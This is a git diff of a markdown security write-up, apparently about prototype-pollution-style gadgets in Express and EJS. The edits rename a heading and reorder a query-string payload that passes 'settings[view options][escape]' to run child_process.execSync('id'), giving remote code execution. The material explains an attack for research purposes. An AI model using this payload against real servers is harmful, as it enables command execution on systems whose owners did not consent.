@@ -13,7 +13,7 @@ weight: 620
 toc: true
 ---
 
-## Express stack
+## Express
 
 [Express](https://www.npmjs.com/package/express) is a minimalist web framework for Node.js which has 31 [dependencies](https://www.npmjs.com/package/express?activeTab=dependencies).
 
@@ -186,13 +186,12 @@ exports.renderFile = function () {
 The `opts` variable is then passed to the `Template` object. So, we can get a RCE with the following query string.
 
 ```
-?settings[view options][escape]=1;return+process.mainModule.require("child_process").execSync("id").toString();
-&client=1
+?client=1&settings[view options][escape]=1;return+process.mainModule.require("child_process").execSync("id").toString();
 ```
 
 This query string is equals to:
 
-```json
+```js
 {
   settings: {
     'view options': {
